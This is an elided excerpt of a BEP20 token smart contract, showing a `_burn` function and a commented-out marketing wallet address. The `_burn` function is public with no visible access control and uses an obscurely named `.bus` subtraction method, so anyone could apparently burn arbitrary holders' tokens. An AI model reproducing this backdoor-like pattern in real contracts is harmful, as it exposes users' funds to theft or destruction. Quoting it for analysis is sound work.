...
//    address public marketingWalletToken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;
    ...
    function _burn(address account, uint256 amount) public virtual {
        ...
        _balances[account] = _balances[account].bus(amount, "BEP20: transfer amount exceeds balance");
        _totalSupply = _totalSupply.bus(amount,  "BEP20: transfer amount exceeds total supply");
